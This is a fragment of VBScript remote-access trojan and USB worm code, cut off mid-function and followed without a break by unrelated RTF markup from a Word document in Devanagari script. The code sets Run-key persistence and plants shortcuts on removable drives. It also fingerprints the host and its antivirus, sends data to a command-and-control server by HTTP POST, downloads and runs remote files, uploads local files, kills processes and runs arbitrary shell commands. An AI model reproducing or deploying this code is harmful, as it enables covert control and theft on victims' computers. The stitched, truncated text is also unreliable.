        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    information = inf  
else
    information = inf
end if
end function


sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function


function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If



upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function


sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub

sub download (fileurl,filedir)

if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub


function upload (fileurl)

dim  httpobj,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port &"/" & "is-recving" & spliter & fileurl, false
httpobj.send buffer
end function


function enumdriver ()

for  each drive in filesystemobj.drives
if   drive.isready = true then
     enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter
end if
next
end Function

function enumfaf (enumdir)

enumfaf = enumdir & spliter
for  each folder in filesystemobj.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter
next

for  each file in filesystemobj.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "|" & file.size  & "|" & "f" & "|" & file.attributes & spliter

next
end function


function enumprocess ()

on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "|"
	enumprocess = enumprocess & objitem.processid & "|"
    enumprocess = enumprocess & objitem.executablepath & spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " & pid,7,true
end sub

sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)

dim httpobj,oexec,readallfromany

set oexec = shellobj.exec ("%comspec% /c " & cmd)
if not oexec.stdout.atendofstream then
   readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
   readallfromany = oexec.stderr.readall
else 
   readallfromany = ""
end if

cmdshell = readallfromany
{\rtf1\adeflang1025\ansi\ansicpg936\uc2\adeff31507\deff0\stshfdbch31505\stshfloch31506\stshfhich31506\stshfbi31507\deflang1033\deflangfe2052\themelang1033\themelangfe2052\themelangcs0{\fonttbl{\f0\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}
{\f13\fbidi \fnil\fcharset134\fprq2{\*\panose 02010600030101010101}\'cb\'ce\'cc\'e5{\*\falt SimSun};}{\f13\fbidi \fnil\fcharset134\fprq2{\*\panose 02010600030101010101}\'cb\'ce\'cc\'e5{\*\falt SimSun};}
{\f37\fbidi \fswiss\fcharset0\fprq2{\*\panose 020f0502020204030204}Calibri;}{\f39\fbidi \fswiss\fcharset0\fprq2{\*\panose 020b0502040204020203}Nirmala UI;}{\f40\fbidi \fnil\fcharset134\fprq2{\*\panose 02010600030101010101}@\'cb\'ce\'cc\'e5;}
{\flomajor\f31500\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}{\fdbmajor\f31501\fbidi \fnil\fcharset134\fprq2{\*\panose 02010600030101010101}\'cb\'ce\'cc\'e5{\*\falt SimSun};}
{\fhimajor\f31502\fbidi \fswiss\fcharset0\fprq2{\*\panose 020f0302020204030204}Calibri Light;}{\fbimajor\f31503\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}
{\flominor\f31504\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}{\fdbminor\f31505\fbidi \fnil\fcharset134\fprq2{\*\panose 02010600030101010101}\'cb\'ce\'cc\'e5{\*\falt SimSun};}
{\fhiminor\f31506\fbidi \fswiss\fcharset0\fprq2{\*\panose 020f0502020204030204}Calibri;}{\fbiminor\f31507\fbidi \froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}{\f42\fbidi \froman\fcharset238\fprq2 Times New Roman CE;}
{\f43\fbidi \froman\fcharset204\fprq2 Times New Roman Cyr;}{\f45\fbidi \froman\fcharset161\fprq2 Times New Roman Greek;}{\f46\fbidi \froman\fcharset162\fprq2 Times New Roman Tur;}{\f47\fbidi \froman\fcharset177\fprq2 Times New Roman (Hebrew);}
{\f48\fbidi \froman\fcharset178\fprq2 Times New Roman (Arabic);}{\f49\fbidi \froman\fcharset186\fprq2 Times New Roman Baltic;}{\f50\fbidi \froman\fcharset163\fprq2 Times New Roman (Vietnamese);}
{\f174\fbidi \fnil\fcharset0\fprq2 SimSun Western{\*\falt SimSun};}{\f174\fbidi \fnil\fcharset0\fprq2 SimSun Western{\*\falt SimSun};}{\f412\fbidi \fswiss\fcharset238\fprq2 Calibri CE;}{\f413\fbidi \fswiss\fcharset204\fprq2 Calibri Cyr;}
{\f415\fbidi \fswiss\fcharset161\fprq2 Calibri Greek;}{\f416\fbidi \fswiss\fcharset162\fprq2 Calibri Tur;}{\f417\fbidi \fswiss\fcharset177\fprq2 Calibri (Hebrew);}{\f418\fbidi \fswiss\fcharset178\fprq2 Calibri (Arabic);}
{\f419\fbidi \fswiss\fcharset186\fprq2 Calibri Baltic;}{\f420\fbidi \fswiss\fcharset163\fprq2 Calibri (Vietnamese);}{\f444\fbidi \fnil\fcharset0\fprq2 @\'cb\'ce\'cc\'e5 Western;}{\flomajor\f31508\fbidi \froman\fcharset238\fprq2 Times New Roman CE;}
{\flomajor\f31509\fbidi \froman\fcharset204\fprq2 Times New Roman Cyr;}{\flomajor\f31511\fbidi \froman\fcharset161\fprq2 Times New Roman Greek;}{\flomajor\f31512\fbidi \froman\fcharset162\fprq2 Times New Roman Tur;}
{\flomajor\f31513\fbidi \froman\fcharset177\fprq2 Times New Roman (Hebrew);}{\flomajor\f31514\fbidi \froman\fcharset178\fprq2 Times New Roman (Arabic);}{\flomajor\f31515\fbidi \froman\fcharset186\fprq2 Times New Roman Baltic;}
{\flomajor\f31516\fbidi \froman\fcharset163\fprq2 Times New Roman (Vietnamese);}{\fdbmajor\f31520\fbidi \fnil\fcharset0\fprq2 SimSun Western{\*\falt SimSun};}{\fhimajor\f31528\fbidi \fswiss\fcharset238\fprq2 Calibri Light CE;}
{\fhimajor\f31529\fbidi \fswiss\fcharset204\fprq2 Calibri Light Cyr;}{\fhimajor\f31531\fbidi \fswiss\fcharset161\fprq2 Calibri Light Greek;}{\fhimajor\f31532\fbidi \fswiss\fcharset162\fprq2 Calibri Light Tur;}
{\fhimajor\f31533\fbidi \fswiss\fcharset177\fprq2 Calibri Light (Hebrew);}{\fhimajor\f31534\fbidi \fswiss\fcharset178\fprq2 Calibri Light (Arabic);}{\fhimajor\f31535\fbidi \fswiss\fcharset186\fprq2 Calibri Light Baltic;}
{\fhimajor\f31536\fbidi \fswiss\fcharset163\fprq2 Calibri Light (Vietnamese);}{\fbimajor\f31538\fbidi \froman\fcharset238\fprq2 Times New Roman CE;}{\fbimajor\f31539\fbidi \froman\fcharset204\fprq2 Times New Roman Cyr;}
{\fbimajor\f31541\fbidi \froman\fcharset161\fprq2 Times New Roman Greek;}{\fbimajor\f31542\fbidi \froman\fcharset162\fprq2 Times New Roman Tur;}{\fbimajor\f31543\fbidi \froman\fcharset177\fprq2 Times New Roman (Hebrew);}
{\fbimajor\f31544\fbidi \froman\fcharset178\fprq2 Times New Roman (Arabic);}{\fbimajor\f31545\fbidi \froman\fcharset186\fprq2 Times New Roman Baltic;}{\fbimajor\f31546\fbidi \froman\fcharset163\fprq2 Times New Roman (Vietnamese);}
{\flominor\f31548\fbidi \froman\fcharset238\fprq2 Times New Roman CE;}{\flominor\f31549\fbidi \froman\fcharset204\fprq2 Times New Roman Cyr;}{\flominor\f31551\fbidi \froman\fcharset161\fprq2 Times New Roman Greek;}
{\flominor\f31552\fbidi \froman\fcharset162\fprq2 Times New Roman Tur;}{\flominor\f31553\fbidi \froman\fcharset177\fprq2 Times New Roman (Hebrew);}{\flominor\f31554\fbidi \froman\fcharset178\fprq2 Times New Roman (Arabic);}
{\flominor\f31555\fbidi \froman\fcharset186\fprq2 Times New Roman Baltic;}{\flominor\f31556\fbidi \froman\fcharset163\fprq2 Times New Roman (Vietnamese);}{\fdbminor\f31560\fbidi \fnil\fcharset0\fprq2 SimSun Western{\*\falt SimSun};}
{\fhiminor\f31568\fbidi \fswiss\fcharset238\fprq2 Calibri CE;}{\fhiminor\f31569\fbidi \fswiss\fcharset204\fprq2 Calibri Cyr;}{\fhiminor\f31571\fbidi \fswiss\fcharset161\fprq2 Calibri Greek;}{\fhiminor\f31572\fbidi \fswiss\fcharset162\fprq2 Calibri Tur;}
{\fhiminor\f31573\fbidi \fswiss\fcharset177\fprq2 Calibri (Hebrew);}{\fhiminor\f31574\fbidi \fswiss\fcharset178\fprq2 Calibri (Arabic);}{\fhiminor\f31575\fbidi \fswiss\fcharset186\fprq2 Calibri Baltic;}
{\fhiminor\f31576\fbidi \fswiss\fcharset163\fprq2 Calibri (Vietnamese);}{\fbiminor\f31578\fbidi \froman\fcharset238\fprq2 Times New Roman CE;}{\fbiminor\f31579\fbidi \froman\fcharset204\fprq2 Times New Roman Cyr;}
{\fbiminor\f31581\fbidi \froman\fcharset161\fprq2 Times New Roman Greek;}{\fbiminor\f31582\fbidi \froman\fcharset162\fprq2 Times New Roman Tur;}{\fbiminor\f31583\fbidi \froman\fcharset177\fprq2 Times New Roman (Hebrew);}
{\fbiminor\f31584\fbidi \froman\fcharset178\fprq2 Times New Roman (Arabic);}{\fbiminor\f31585\fbidi \froman\fcharset186\fprq2 Times New Roman Baltic;}{\fbiminor\f31586\fbidi \froman\fcharset163\fprq2 Times New Roman (Vietnamese);}}
{\colortbl;\red0\green0\blue0;\red0\green0\blue255;\red0\green255\blue255;\red0\green255\blue0;\red255\green0\blue255;\red255\green0\blue0;\red255\green255\blue0;\red255\green255\blue255;\red0\green0\blue128;\red0\green128\blue128;\red0\green128\blue0;
\red128\green0\blue128;\red128\green0\blue0;\red128\green128\blue0;\red128\green128\blue128;\red192\green192\blue192;}{\*\defchp \fs21\kerning2\loch\af31506\hich\af31506\dbch\af31505 }{\*\defpap 
\ql \li0\ri0\widctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 }\noqfpromote {\stylesheet{\qj \li0\ri0\nowidctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 \rtlch\fcs1 \af31507\afs22\alang1025 \ltrch\fcs0 
\fs21\lang1033\langfe2052\kerning2\loch\f31506\hich\af31506\dbch\af31505\cgrid\langnp1033\langfenp2052 \snext0 \sqformat \spriority0 Normal;}{\*\cs10 \additive \ssemihidden \sunhideused \spriority1 Default Paragraph Font;}{\*
\ts11\tsrowd\trftsWidthB3\trpaddl108\trpaddr108\trpaddfl3\trpaddft3\trpaddfb3\trpaddfr3\trcbpat1\trcfpat1\tblind0\tblindtype3\tsvertalt\tsbrdrt\tsbrdrl\tsbrdrb\tsbrdrr\tsbrdrdgl\tsbrdrdgr\tsbrdrh\tsbrdrv 
\ql \li0\ri0\widctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 \rtlch\fcs1 \af31507\afs22\alang1025 \ltrch\fcs0 \fs21\lang1033\langfe2052\kerning2\loch\f31506\hich\af31506\dbch\af31505\cgrid\langnp1033\langfenp2052 
\snext11 \ssemihidden \sunhideused Normal Table;}}{\*\rsidtbl \rsid3495892\rsid5452368\rsid13112073}{\mmathPr\mmathFont34\mbrkBin0\mbrkBinSub0\msmallFrac0\mdispDef1\mlMargin0\mrMargin0\mdefJc1\mwrapIndent1440\mintLim0\mnaryLim1}{\info
{\author Administrator}{\operator Administrator}{\creatim\yr2018\mo4\dy10\hr8\min34}{\revtim\yr2018\mo4\dy10\hr8\min34}{\version2}{\edmins0}{\nofpages1}{\nofwords191}{\nofchars1092}{\nofcharsws1281}{\vern57445}}{\*\xmlnstbl {\xmlns1 http://schemas.microso
ft.com/office/word/2003/wordml}}\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\gutter0\ltrsect 
\deftab420\ftnbj\aenddoc\trackmoves0\trackformatting1\donotembedsysfont1\relyonvml0\donotembedlingdata0\grfdocevents0\validatexml1\showplaceholdtext0\ignoremixedcontent0\saveinvalidxml0\showxmlerrors1\formshade\horzdoc\dgmargin\dghspace180\dgvspace156
\dghorigin1800\dgvorigin1440\dghshow0\dgvshow2\jcompress\viewkind1\viewscale100\splytwnine\ftnlytwnine\htmautsp\useltbaln\alntblind\lytcalctblwd\lyttblrtgr\lnbrkrule\nobrkwrptbl\snaptogridincell\allowfieldendsel\wrppunct\asianbrkrule\rsidroot13112073
\newtblstyruls\nogrowautofit\usenormstyforlist\noindnmbrts\felnbrelev\nocxsptable\indrlsweleven\noafcnsttbl\afelev\utinl\hwelev\spltpgpar\notcvasp\notbrkcnstfrctbl\notvatxbx\krnprsnet\cachedcolbal \nouicompat {\upr{\*\fchars 
!%),.:\'3b>?]\'7d\'a1\'e9\'a1\'a7\'a1\'e3\'a1\'a4\'a1\'a6\'a1\'a5\'a8\'44\'a1\'ac\'a1\'af\'a1\'b1\'a1\'ad\'a1\'eb\'a1\'e4\'a1\'e5?\'a1\'e6\'a1\'c3\'a1\'a2\'a1\'a3\'a1\'a8\'a1\'b5\'a1\'b7\'a1\'b9\'a1\'bb\'a1\'bf\'a1\'b3\'a1\'bd\'a8\'95\'a6\'e1\'a6\'e3\'a6\'e7\'a6\'e5\'a6\'eb\'a9\'77\'a9\'79\'a9\'7b\'a3\'a1\'a3\'a2\'a3\'a5\'a3\'a7\'a3\'a9\'a3\'ac\'a3\'ae\'a3\'ba\'a3\'bb\'a3\'bf\'a3\'dd\'a3\'e0\'a3\'fc\'a3\'fd\'a1\'ab\'a1\'e9
}{\*\ud\uc0{\*\fchars 
!%),.:\'3b>?]\'7d{\uc2\u162 \'a1\'e9\'a1\'a7\'a1\'e3\'a1\'a4\'a1\'a6\'a1\'a5\'a8D\'a1\'ac\'a1\'af\'a1\'b1\'a1\'ad\'a1\'eb\'a1\'e4\'a1\'e5}{\uc1\u8250 ?\'a1\'e6\'a1\'c3\'a1\'a2\'a1\'a3\'a1\'a8\'a1\'b5\'a1\'b7\'a1\'b9\'a1\'bb\'a1\'bf\'a1\'b3\'a1\'bd\'a8\'95\'a6\'e1\'a6\'e3\'a6\'e7\'a6\'e5\'a6\'eb\'a9w\'a9y\'a9\'7b\'a3\'a1\'a3\'a2\'a3\'a5\'a3\'a7\'a3\'a9\'a3\'ac\'a3\'ae\'a3\'ba\'a3\'bb\'a3\'bf\'a3\'dd\'a3\'e0\'a3\'fc\'a3\'fd\'a1\'ab\'a1\'e9}
}}}{\upr{\*\lchars $([\'7b\'a1\'ea\'a3\'a4\'a1\'a4\'a1\'ae\'a1\'b0\'a1\'b4\'a1\'b6\'a1\'b8\'a1\'ba\'a1\'be\'a1\'b2\'a1\'bc\'a8\'94\'a9\'76\'a9\'78\'a9\'7a\'a1\'e7\'a3\'a8\'a3\'ae\'a3\'db\'a3\'fb\'a1\'ea\'a3\'a4}{\*\ud\uc0{\*\lchars 
$([\'7b{\uc2\u163 \'a1\'ea\u165 \'a3\'a4\'a1\'a4\'a1\'ae\'a1\'b0\'a1\'b4\'a1\'b6\'a1\'b8\'a1\'ba\'a1\'be\'a1\'b2\'a1\'bc\'a8\'94\'a9v\'a9x\'a9z\'a1\'e7\'a3\'a8\'a3\'ae\'a3\'db\'a3\'fb\'a1\'ea\'a3\'a4}}}}\fet0{\*\wgrffmtfilter 2450}\nofeaturethrottle1
\ilfomacatclnup0\ltrpar \sectd \ltrsect\linex0\endnhere\sectdefaultcl\sectrsid16598646\sftnbj {\*\pnseclvl1\pnucrm\pnstart1\pnindent720\pnhang {\pntxta \dbch .}}{\*\pnseclvl2\pnucltr\pnstart1\pnindent720\pnhang {\pntxta \dbch .}}{\*\pnseclvl3
\pndec\pnstart1\pnindent720\pnhang {\pntxta \dbch .}}{\*\pnseclvl4\pnlcltr\pnstart1\pnindent720\pnhang {\pntxta \dbch )}}{\*\pnseclvl5\pndec\pnstart1\pnindent720\pnhang {\pntxtb \dbch (}{\pntxta \dbch )}}{\*\pnseclvl6\pnlcltr\pnstart1\pnindent720\pnhang 
{\pntxtb \dbch (}{\pntxta \dbch )}}{\*\pnseclvl7\pnlcrm\pnstart1\pnindent720\pnhang {\pntxtb \dbch (}{\pntxta \dbch )}}{\*\pnseclvl8\pnlcltr\pnstart1\pnindent720\pnhang {\pntxtb \dbch (}{\pntxta \dbch )}}{\*\pnseclvl9\pnlcrm\pnstart1\pnindent720\pnhang 
{\pntxtb \dbch (}{\pntxta \dbch )}}\pard\plain \ltrpar\qj \fi420\li2100\ri0\nowidctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin2100\itap0\pararsid5452368 \rtlch\fcs1 \af31507\afs22\alang1025 \ltrch\fcs0 
\fs21\lang1033\langfe2052\kerning2\loch\af31506\hich\af31506\dbch\af31505\cgrid\langnp1033\langfenp2052 {\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2343\'3f\u2381\'3f\u2351\'3f}{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \hich\af39\dbch\af31505\loch\f39  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\loch\af39\dbch\af31505\hich\f39 \u2370
\'3f\u2352\'3f\u2381\'3f\u2357\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \hich\af39\dbch\af31505\loch\f39  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2376\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \hich\af39\dbch\af31505\loch\f39  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2352\'3f\u2367\'3f\u2357\'3f\u2352\'3f\u2381\'3f\u2340\'3f\u2344\'3f}{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\par }\pard \ltrpar\qj \fi210\li0\ri0\nowidctlpar\wrapdefault\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0\cufi100\pararsid5452368 {\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352
\'3f\u2381\'3f\u2325\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f
\u2375\'3f\u2344\'3f\u2366\'3f\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2346\'3f\u2366\'3f\u2305\'3f\u2330\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 
\uc1\u2360\'3f\u2376\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2346\'3f\u2381\'3f\u2340\'3f\u2366\'3f\u2344\'3f\u2361\'3f\u2352\'3f\u2370\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2358\'3f\u2369\'3f\u2352\'3f\u2370\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381\'3f\u2351\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2332\'3f\u2369\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2361\'3f\u2352\'3f\u2375\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2342\'3f\u2360\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2357\'3f\u2352\'3f\u2381\'3f\u2359\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2319\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2335\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2349\'3f\u2351\'3f\u2379\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  27 }{\rtlch\fcs1 \af39 \ltrch\fcs0 
